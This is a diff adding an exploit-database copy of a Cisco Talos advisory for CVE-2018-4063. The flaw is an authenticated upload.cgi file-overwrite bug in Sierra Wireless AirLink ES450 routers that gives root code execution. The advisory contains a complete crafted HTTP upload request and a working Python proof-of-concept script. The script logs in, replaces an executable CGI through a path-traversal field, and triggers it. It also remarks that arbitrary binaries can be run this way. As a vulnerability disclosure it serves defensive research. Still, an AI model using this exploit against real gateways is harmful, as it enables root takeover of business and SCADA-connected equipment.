@@ -1,0 +1,152 @@
+id: 32608
+date: 04/29/2019
+title: Sierra Wireless AirLink ES450 ACEManager upload.cgi Remote Code Execution Exploit
+author: Cisco Talos
+cves: CVE-2018-4063
+
+Sierra Wireless AirLink ES450 ACEManager upload.cgi Remote Code Execution Vulnerability
+
+CVE Number
+CVE-2018-4063
+
+Summary
+
+An exploitable remote code execution vulnerability exists in the upload.cgi functionality of Sierra Wireless AirLink ES450 FW 4.9.3. A specially crafted HTTP request can upload a file, resulting in executable code being uploaded, and routable, to the webserver. An attacker can make an authenticated HTTP request to trigger this vulnerability.
+Tested Versions
+
+Sierra Wireless AirLink ES450 FW 4.9.3
+
+Product URLs
+
+https://www.sierrawireless.com/products-and-solutions/routers-gateways/es450/
+CVSSv3 Score
+
+9.9 - CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H
+CWE
+
+CWE-434: Unrestricted Upload of File with Dangerous Type
+
+Details
+
+Sierra Wireless is a wireless communications equipement designer and manufacturer. They provide both embedded solutions as well as wireless hardware solutions, including both the ES450 and GX450 devices. The AirLink ES450 is a LTE gateway designed for distributed enterprise. The ES450 is typically seen connecting Point-of-sale devices, remote SCADA equipment, or other business critical equipment. The AirLink ES450 also provides a terminal server for remote out-of-band administration.
+
+ACEManager is the web server included with the AirLink ES450. This web server is responsible for the majority of interactions in the device. Some specific capabilities of the web server are routing, device reconfiguration, user authentication and certificate management. The vendor has stated that the ACEManager web application is not accessible by default from the Cellular WAN.
+
+This vulnerability exists in the file upload capability of templates within the AirLink 450. When uploading template files, you can specify the name of the file that you are uploading. There are no restrictions in place that protect the files that are currently on the device, used for normal operation. If a file is uploaded with the same name of the file that already exists in the directory, then we inherit the permissions of that file. In this case, the files that exist in the directory that the template file is saved to are:
+
+    fw_expected_rm.cgi
+    fw_status.cgi
+    fw_upload_init.cgi
+    fw_upload_init.sh
+    rm_switching_action.cgi
+
+These files all have executable permissions on the device. By uploading a small wrapper, we can upload arbitrary code to the device and run by simply navigating to the web page through the browser. Since ACEManager is running as root any executables run will be running also as root. The following request shows a basic file upload to show running permissions.
+
+POST /cgi-bin/upload.cgi HTTP/1.1
+Host: 192.168.13.31:9191
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.13.31:9191/admin/ACEmanagerX.html
+Cookie: token=2389c2dfe87bf6e33b0f9009a1ae9889
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: multipart/form-data; boundary=--------1355696654
+Content-Length: 501
+
+----------1355696654
+Content-Disposition: form-data; name="save-as-filename"
+
+SWITemplate.xml
+----------1355696654
+Content-Disposition: form-data; name="file-location"
+
+../admin/SWITemplate.xml
+----------1355696654
+Content-Disposition: form-data; name="upload-file"; filename="fw_upload_init.cgi"
+Content-Type: text/plain
+
+#!/bin/sh
+. /tmp/swialeosdefs
+. /usr/local/sbin/webif_lib
+eval "`/sbin/proccgi $*`"
+print_http_header
+echo "Remote Code Execution as `whoami` : `id`"
+exit 0;
+
+----------1355696654--
+
+While this code is running a simple shell script, it is possible to upload binaries
+
+These vulnerabilities were discovered and tested using the AirLink ES450. Most likely this vulnerabilities also affects the AirLink GX450 product as well.
+
+
+Exploit Proof of Concept
+
+#!/usr/bin/env python
+#Author : Carl Hurd, Cisco Talos
+import sys
+import requests
+
+# This does not have to be a shell script, you can upload a binary and run it in a similar fashion
+uploaded_file = """#!/bin/sh
+. /tmp/swialeosdefs
+. /usr/local/sbin/webif_lib
+eval "`/sbin/proccgi $*`"
+print_http_header
+echo "Remote Code Execution as `whoami` : `id`"
+exit 0;"""
+
+def auth(ip, port, password):
+    data = """<request xmlns="urn:acemanager">
+<connect>
+<login>user</login>
+<password><![CDATA[{}]]></password>
+</connect>
+</request>""".format(password)
+
+    response = requests.post("http://"+ip+":"+port+"/xml/Connect.xml", data=data)
+
+    try:
+        cookies = dict(token=response.headers["Set-Cookie"].split("; ")[0][len("token="):])
+        return cookies
+    except:
+        print("Error while authenticating")
+        sys.exit(0)
+
+def main():
+    if len(sys.argv) < 4 or len(sys.argv) > 4:
+        print("Usage : {} [ip address] [port] [password of user] [absolute path of file to check]".format(sys.argv[0]))
+        sys.exit(0)
+
+    ip = sys.argv[1]
+    port = sys.argv[2]
+    password = sys.argv[3]
+
+    cookies = auth(ip, port, password)
+
+    files = {'save-as-filename': (None, "SWITemplate.xml"), 'file-location': (None, "../admin/SWITemplate.xml"), 'upload-file': ('fw_upload_init.cgi', uploaded_file, 'text/xml')}
+    response = requests.post("http://"+ip+":"+port+"/cgi-bin/upload.cgi", cookies=cookies, files=files)
+
+    response = requests.get("http://"+ip+":"+port+"/admin/fw_upload_init.cgi", cookies=cookies)
+
+    print(response.text)
+
+if __name__ == "__main__":
+    main()
+
+Timeline
+
+2018-12-14 - Vendor disclosure
+2018-12-17 - Vendor acknowledged
+2019-01-08 - Discussion to review vendor's analysis of issues
+2019-03-26 - Vendor established timelines for fix/public disclosure
+2019-04-20 - Talos provided revised CVSS score on TALOS-2018-0746, TALOS-2018-0751, TALOS-2018-0752, TALOS-2018-0755, and TALOS-2018-0756
+2019-04-25 - Public Release
+
+Credit
+
+Discovered by Carl Hurd of Cisco Talos.
+
+#  0day.today [2023-03-25]  #
